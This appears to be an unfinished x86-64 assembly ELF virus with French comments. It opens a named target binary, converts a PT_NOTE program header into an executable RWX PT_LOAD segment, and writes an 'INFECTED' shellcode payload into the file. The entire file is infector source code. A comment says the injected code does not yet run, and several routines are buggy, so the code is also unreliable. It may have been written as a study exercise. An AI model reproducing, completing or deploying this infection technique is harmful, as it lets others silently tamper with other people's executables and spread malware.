%define PT_NOTE 4      
%define PT_LOAD 1
%define ELF_MAGIC 0x464C457F ; Signature ELF en little-endian (0x7F 'E' 'L' 'F')

section .data      
    msg_error_open_file db "Error opening file", 0xA, 0    
    msg_not_elf db "/!\ File Is Not ELF", 0xA, 0          
    msg_found_pt_note db "PT_NOTE found", 0xA, 0           
    msg_injected db "Code succesfully injected !", 0xA, 0  
    msg_pt_note_modified db "PT_NOTE converted to PT_LOAD and saved", 0xA, 0 
    fichier db "CopySafeBinary", 0 		; Nom du fichier cible                       
    buffer_size equ 20    

	payload db 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
  			db 0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x09, 0x00, 0x00, 0x00, 0x0f, 0x05,
  			db 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f, 0x05, 0x00, 0x00,
			db 0x49, 0x4e, 0x46, 0x45, 0x43, 0x54, 0x45, 0x44, 0x0a    
	payload_size equ $ - payload

 
section .bss
    fd resq 1                     ; File descriptor
    statbuf resb 144              ; Buffer pour stat syscall
    buffer resb 256               ; Buffer générique
    elf_header resb 64            ; Stockage pour l'en-tête ELF
    programm_header resb 56       ; Taille d'un PHDR 
    number_buffer resb buffer_size ; Buffer pour des valeurs numériques
    original_entry_point resq 1   ; Point d'entrée original
    injection_address resq 1      ; Adresse pour l'injection
 
section .text
global _start
 
_start:
	; Ouverture fichier
    mov rax, 2            ; syscall: open
    lea rdi, [fichier]    ; Charger l'adresse du nom de fichier
    mov rsi, 2            ; O_RDWR
    xor rdx, rdx          
    syscall
    mov [fd], rax         ; Sauvegarder le descripteur de fichier

	; Vérif erreur ouverture
	cmp rax, 0
	js error_open_file
    
    ; --- Lecture et vérification du fichier ELF ---
    ; Lire les 4 premiers octets du fichier
    mov rax, 0                   ; Syscall: read
    mov rdi, [fd]                ; Descripteur de fichier (fd)
    lea rsi, [buffer]            ; Adresse de destination (buffer)
    mov rdx, 4                   ; Lire 4 octets
    syscall
    mov r8, rax                  ; r8 contient le nombre d'octets lus

    ; Vérif si 4 octets ont été lus
    cmp r8, 4                    ; Comparer r8 avec 4
    jne not_elf                  ; Si moins de 4 octets, ce n'est pas un ELF

    ; Charger les 4 octets dans eax pour comparaison
    mov eax, dword [buffer]      ; Charger les 4 octets du buffer dans eax
    cmp eax, ELF_MAGIC           ; Comparer avec la signature ELF (0x7F454C46)
    jne not_elf                  ; Si la signature ne correspond pas, ce n'est pas un ELF
     
	; Fermeture fichier pour ne pas avoir les informations décalé
    mov rdi, [fd]                 ; Descripteur de fichier à fermer
    mov rax, 3                    ; Syscall: close
    syscall
    mov qword [fd], -1            ; Marquer le descripteur comme fermé
    
	; Réouverture
	lea rdi, [fichier]         ; Adresse du nom du fichier
    mov rsi, 2                 ; O_RDWR : lecture/écriture
    xor rdx, rdx               ; Pas de flags supplémentaires
    mov rax, 2                 ; Syscall: open
    syscall
    mov [fd], rax              ; Sauvegarder le descripteur de fichier
 
	; --- Lecture de l'en-tête ELF ---
   	mov rax, 0                 ; Syscall: read
    mov rdi, [fd]              ; Descripteur de fichier
    lea rsi, [elf_header]      ; Buffer pour stocker l'en-tête ELF
    mov rdx, 64                ; Taille de l'en-tête ELF (64 octets)
    syscall
    
	; --- Récupération du point d'entrée original ---
    mov rax, qword [elf_header + 24]  ; Offset e_entry dans l'en-tête ELF
    mov [original_entry_point], rax   ; Sauvegarder le point d'entrée original
 
	; --- Lecture des Program Headers ---
    movzx rcx, word [elf_header + 0x38] ; Offset e_phnum : nombre de Program Headers
    xor rbx, rbx                        ; Initialiser l'index à 0
 
programm_header_loop:
    ; Condition pour quitter la boucle
    cmp rbx, rcx         
    jge exit_loop        

    push rcx              ; Sauvegarde rcx 
    push rbx              ; Sauvegarde rbx 

    ; Détermine l'index de chaque Header
    mov rax, rbx          ; Déplace l'index dans rax
    mov rdx, 56           ; Taille d'un header
    mul rdx                ; Multiplie rax (index actuel) par 56 (taille de chaque header)
    add rax, 64            ; Ajoute 64 à rax (pour ajuster l'adresse du header dans le fichier)

    mov rdi, [fd]         ; Charge le descripteur de fichier (fd) dans rdi
    mov rsi, rax          ; Charge l'adresse calculée de l'en-tête dans rsi
    xor rdx, rdx          
    mov rax, 8            ; Syscall: read
    syscall               ; Appelle le syscall pour lire dans le fichier

    ; Lire le programme Header
    mov rax, 0            ; Syscall : read 
    mov rdi, [fd]         ; Charge de nouveau le descripteur de fichier (fd)
    lea rsi, [programm_header] ; Charge l'adresse de l'en-tête du programme dans rsi
    mov rdx, 56           ; Charge la taille de l'en-tête dans rdx
    syscall               

    mov eax, dword [programm_header] ; Charge la valeur du type de programme dans eax
    cmp eax, PT_NOTE            ; Header est un PT_NOTE ?
    jne not_pt_note      		; Si non, on jump à not_pt_note

	lea rdi, [msg_found_pt_note]
	call print_message

	; --- Modification PT_note en PT_load ---
	mov dword [programm_header], 1 	; Changement PT_NOTE en PT_LOAD
	mov dword [programm_header + 4], 7 ; Ecriture des nouvelles permissions RWX

	; Ecriture du p_header modifié dans le fichier ELF
    mov rax, 1            ; Syscall : write
    mov rdi, [fd]         ; Charge le descripteur de fichier (fd)
    lea rsi, [programm_header] ; Charge l'adresse du programme header dans rsi
    mov rdx, 56           ; Taille de l'en-tête
    syscall      

	lea rdi, [msg_pt_note_modified] 
	call print_message     

	; ----------------------------------------------------------------------------
	; --- --- Injection de code --- ---
	; ----------------------------------------------------------------------------

	; L'INFECTION FONCTIONNE MAIS LE CODE N'EST PAS EXECUTEE
	; Récupération de l'adresse virtuelle
	mov rax, qword [programm_header + 16] ; p_vaddr
	mov [injection_address], rax    

	mov rax, qword [programm_header + 8] ; p_offset
	mov rsi, rax                        ; Offset pour l’injection

	mov rdi, [fd]          ; Descripteur de fichier
	mov rax, 8             ; Syscall: lseek
	xor rdx, rdx
	syscall

	mov rax, 1             ; Syscall: write
	lea rsi, [payload]     ; Charge l'adresse du payload
	mov rdx, payload_size  ; Taille du payload
	syscall

	; changer le curseur de e_entry sur le début du infected
	; remettre le curseur 

    jmp exit_loop        

; -------------------------------------------------------------------------------------------
; --- Fonctions Utilitaires ---
; -------------------------------------------------------------------------------------------
not_pt_note:
	pop rbx
	pop rcx
	inc rbx
	jmp programm_header_loop
     
 
exit_loop:
	mov rax, 3
   	mov rdi, [fd]
	syscall    
	jmp exit
    
not_elf:
	lea rsi, [msg_not_elf]
	call print_message
	syscall    
	jmp exit    
  
error_open_file:
	lea rsi, [msg_error_open_file]
	call print_message
	syscall
	jmp exit

 
 
exit:   	 
	mov rdi, [fd]
	mov rax, 3
	syscall
    
	; Calculer la longueur en soustrayant l'adresse de début de l'adresse de fin+1
	mov rdx, number_buffer
	add rdx, buffer_size
	sub rdx, rbx       	; Calculer la longueur de la chaîne
    
	mov rax, 1
	mov rdi, 1
	mov rsi, rbx      	 
	syscall
 
	mov rax, 60
	xor rdi, rdi
	syscall


print_message:
    ; Charger l'adresse du message dans rsi
    mov rsi, rdi                ; Charger l'adresse du message dans rsi
    call find_length            ; Trouver la longueur du message
    mov rax, 1                  ; Syscall: write
    mov rdi, 1                  ; Descripteur pour stdout
    syscall                     
    ret

find_length:
    xor rax, rax                ; Initialiser la longueur à 0
	.find_length_loop:
		cmp byte [rsi + rax], 0      ; Vérifier si le caractère est nul (fin de chaîne)
		je .find_length_done          ; Si c'est nul, on a trouvé la fin
		inc rax                      ; Sinon, incrémenter la longueur
		jmp .find_length_loop         ; Continuer la boucle
	.find_length_done:
		mov rdx, rax                 ; Charger la longueur du message dans rdx
		ret
